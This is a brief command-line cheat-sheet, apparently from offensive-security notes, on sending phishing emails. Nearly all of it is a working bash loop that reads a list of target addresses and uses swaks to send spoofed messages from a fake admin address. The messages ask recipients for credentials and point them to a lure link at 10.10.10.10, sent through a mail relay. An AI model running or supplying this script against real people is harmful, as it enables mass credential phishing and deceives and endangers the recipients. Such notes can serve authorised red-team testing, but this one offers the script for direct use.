# Sending Phishing Emails - Command Line


## Bash and SWAKS

[URL] (https://ryanstutorials.net/bash-scripting-tutorial/bash-loops.php)

[*] email.txt contains a list of email addresses to phish



```
phishing-script.sh 
#!/bin/sh

while read email; do swaks -to $email -from admin@spoofed-domain.com -header "Subject: Can I Haz Creds Plz" -body "goto http://10.10.10.10/" -server 10.10.100.100; echo "Sleeping 5"; sleep 5; done < email.txt
```